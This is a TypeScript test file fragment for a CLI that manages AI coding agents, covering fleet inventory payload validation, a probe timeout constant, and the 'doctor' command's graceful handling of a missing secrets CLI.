    expect(asFleetInventory(payload(undefined))?.hookRuntime).toBeUndefined();
  });

  it('rejects remote path/text payloads and incomplete or unknown enum state', () => {
    expect(asFleetInventory(payload({ claude: { '2.1.0': { state: 'broken', path: '/remote/hook.sh' } } }))).toBeNull();
    expect(asFleetInventory(payload({ claude: { '2.1.0': 'broken because x' } }))).toBeNull();
    expect(asFleetInventory(payload({ claude: { '2.1.0': 'healthy', '2.2.0': 'broken' } }))).toBeNull();
    expect(asFleetInventory(payload({}))).toBeNull();
  });
});

describe('the fleet inventory probe deadline', () => {
  it('allows 180s — above the real cost of the command it runs', () => {
    // 30s sat BELOW it (56s measured on yosemite-m0, 136s on an idle box), so
    // every slow device silently contributed no inventory, sign-in, divergence
    // or secret findings at all.
    expect(FLEET_INVENTORY_TIMEOUT_MS).toBe(180_000);
    expect(FLEET_INVENTORY_TIMEOUT_MS).toBeGreaterThan(136_000);
  });
});

// ─── missing standalone `secrets` prints guidance, not a stacktrace (PHNX-3989) ─

/** Absolute path to the bun runner so the child can start with an empty PATH. */
function resolveBun(): string {
  for (const dir of (process.env.PATH ?? '').split(path.delimiter)) {
    if (!dir) continue;
    const candidate = path.join(dir, 'bun');
    if (fs.existsSync(candidate)) return candidate;
  }
  return 'bun';
}

describe('doctor when the standalone `secrets` CLI is missing (PHNX-3989)', () => {
  // doctor is the umbrella diagnostic (AGENTS.md §Diagnostic command taxonomy) —
  // it must never crash outright because ONE subsystem is unavailable, the same
  // way an uninstalled cursor/opencode/antigravity login degrades to a finding
  // rather than aborting the whole report. Its rc-file / master-passphrase scans
  // route through the sync secrets client (doctor.ts), which throws
  // SecretsClientError('SECRETS_BIN_MISSING') with no standalone installed;
  // doctor.ts's scanUserRcFiles()/masterPassphraseInEnv() wrappers swallow that
  // transport error and degrade to "nothing to report" from those two checks so
  // the rest of the fleet report still prints. Spawned with an EMPTY PATH and a
  // blank SECRETS_BIN so nothing resolves `secrets`.
  it('degrades gracefully — full report, exit 0, no stacktrace', () => {
    seedHome(['2.0.0'], '2.0.0');
    const r = spawnSync(resolveBun(), [INDEX, 'doctor', '--cwd', projectDir], {
      encoding: 'utf-8',
      timeout: 15_000,
      env: {
        HOME: testHome,
        USERPROFILE: testHome,
        PATH: '',
        SECRETS_BIN: '',
        AGENTS_NO_AUTOPULL: '1',
        AGENTS_NO_UPDATE_CHECK: '1',
        AGENTS_NO_USAGE_TRACK: '1',
        AGENTS_DEVICES_DIR: path.join(testHome, '.agents', '.history', 'devices'),
        AGENTS_HOOK_SHIMS_DIR: path.join(testHome, 'hook-shims'),
        AGENTS_HOOK_CACHE_DIR: path.join(testHome, 'hook-cache'),
        AGENTS_LOGS_DIR: path.join(testHome, 'logs'),
        AGENTS_PERF_DIR: path.join(testHome, 'perf'),
      },
    });
    expect(r.status).toBe(0);
    // The one thing this guards: the typed transport error never surfaces raw.
    expect(r.stdout + r.stderr).not.toContain('SecretsClientError');
    expect(r.stdout + r.stderr).not.toMatch(/\n\s+at /);
    expect(r.stdout + r.stderr).not.toContain('secrets-client.ts');
  });
});
